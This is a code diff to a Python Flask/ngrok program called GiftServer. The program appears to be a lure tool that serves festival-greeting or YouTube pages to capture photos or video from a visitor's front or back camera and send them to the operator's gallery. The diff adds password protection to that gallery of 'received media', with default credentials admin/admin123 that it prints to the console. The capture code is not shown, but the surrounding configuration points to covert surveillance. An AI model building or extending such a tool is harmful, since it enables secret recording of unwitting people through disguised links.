@@ -14,7 +14,8 @@ import urllib.request
 import re
 from datetime import datetime
 from pathlib import Path
-from flask import Flask, request, jsonify, send_file
+from functools import wraps
+from flask import Flask, request, jsonify, send_file, Response
 from flask_cors import CORS
 from werkzeug.utils import secure_filename
 
@@ -39,6 +40,24 @@ CORS(app)
 app.config["MAX_CONTENT_LENGTH"] = 5 * 1024 * 1024 * 1024
 
 received_files = []
+
+# ============================================
+# AUTHENTICATION DECORATOR
+# ============================================
+def requires_auth(f):
+    @wraps(f)
+    def decorated(*args, **kwargs):
+        if app.config.get('AUTH_ENABLED', False):
+            auth = request.authorization
+            admin_user = app.config.get('GALLERY_USER')
+            admin_pass = app.config.get('GALLERY_PASS')
+            if not auth or auth.username != admin_user or auth.password != admin_pass:
+                return Response(
+                    '🔒 Access Denied: Gallery authentication required.\n', 401,
+                    {'WWW-Authenticate': 'Basic realm="Private Media Gallery"'}
+                )
+        return f(*args, **kwargs)
+    return decorated
 
 # ============================================
 # WEB ROUTES
@@ -133,6 +152,7 @@ def upload_media():
         return jsonify({'error': str(e)}), 500
 
 @app.route('/view/<filename>', methods=['GET'])
+@requires_auth
 def view_media(filename):
     filepath = UPLOAD_FOLDER / filename
     if not filepath.exists():
@@ -150,6 +170,7 @@ def view_media(filename):
     return send_file(filepath, mimetype=mimetype, as_attachment=False)
 
 @app.route('/gallery', methods=['GET'])
+@requires_auth
 def gallery_page():
     html_content = """<!DOCTYPE html>
 <html lang="en">
@@ -287,6 +308,7 @@ def gallery_page():
     return html_content
 
 @app.route('/files', methods=['GET'])
+@requires_auth
 def list_files():
     global received_files
     # Sync received_files with physical disk files
@@ -296,6 +318,7 @@ def list_files():
     })
 
 @app.route('/download/<filename>', methods=['GET'])
+@requires_auth
 def download_file(filename):
     filepath = UPLOAD_FOLDER / filename
     if filepath.exists():
@@ -303,6 +326,7 @@ def download_file(filename):
     return jsonify({'error': 'File not found'}), 404
 
 @app.route('/delete/<filename>', methods=['POST', 'DELETE'])
+@requires_auth
 def delete_file(filename):
     try:
         safe_name = secure_filename(filename)
@@ -326,6 +350,7 @@ def delete_file(filename):
         return jsonify({'error': str(e)}), 500
 
 @app.route('/delete-all', methods=['POST', 'DELETE'])
+@requires_auth
 def delete_all_files():
     try:
         global received_files
@@ -615,6 +640,23 @@ class GiftServer:
                 self.ngrok_process.kill()
         print("✅ Done!")
 
+    def get_gallery_credentials(self):
+        print("\n🔐 PRIVATE GALLERY LOGIN SETUP:")
+        user = input("   👤 Enter Gallery Username (default: admin): ").strip()
+        if not user:
+            user = "admin"
+            print(f"      Using default username: {user}")
+            
+        password = input("   🔑 Enter Gallery Password (default: admin123): ").strip()
+        if not password:
+            password = "admin123"
+            print(f"      Using default password: {password}")
+            
+        app.config['GALLERY_USER'] = user
+        app.config['GALLERY_PASS'] = password
+        app.config['AUTH_ENABLED'] = True
+        return user, password
+
     def run(self):
         try:
             # Setup
@@ -639,6 +681,9 @@ class GiftServer:
                 video_id = self.get_youtube_video()
                 name = None
             
+            # Setup Gallery Username & Password
+            user, password = self.get_gallery_credentials()
+            
             # Start server
             self.start_flask()
             if not self.start_ngrok():
@@ -659,18 +704,20 @@ class GiftServer:
             print("\n" + "=" * 60)
             print("🖼️ YOUR PRIVATE ONLINE GALLERY (VIEW RECEIVED MEDIA):")
             print("=" * 60)
-            print(f"\n🔗 {gallery_link}\n")
+            print(f"\n🔗 {gallery_link}")
+            print(f"🔐 Login Credentials: Username: {user} | Password: {password}\n")
             print("=" * 60)
             
             print("\n📋 Configuration Summary:")
-            print(f"   🎯 Mode:         {mode_name}")
-            print(f"   📷 Camera:       {'Front' if camera == 'user' else 'Back'}")
-            print(f"   📸 Capture:      {'Video (' + str(duration) + 's)' if capture_mode == 'video' else 'Photo (' + str(photos) + ' photos)'}")
-            print(f"   🌐 Server Mode:  Direct Ngrok Server Only")
+            print(f"   🎯 Mode:          {mode_name}")
+            print(f"   📷 Camera:        {'Front' if camera == 'user' else 'Back'}")
+            print(f"   📸 Capture:       {'Video (' + str(duration) + 's)' if capture_mode == 'video' else 'Photo (' + str(photos) + ' photos)'}")
+            print(f"   🌐 Server Mode:   Direct Ngrok Server Only")
+            print(f"   🔐 Gallery Login: Username={user} | Password={password}")
             if mode == 'festival':
-                print(f"   🎊 Festival:     {name}")
+                print(f"   🎊 Festival:      {name}")
             else:
-                print(f"   🎬 Video ID:     {video_id}")
+                print(f"   🎬 Video ID:      {video_id}")
             
             self.wait_for_files()
             
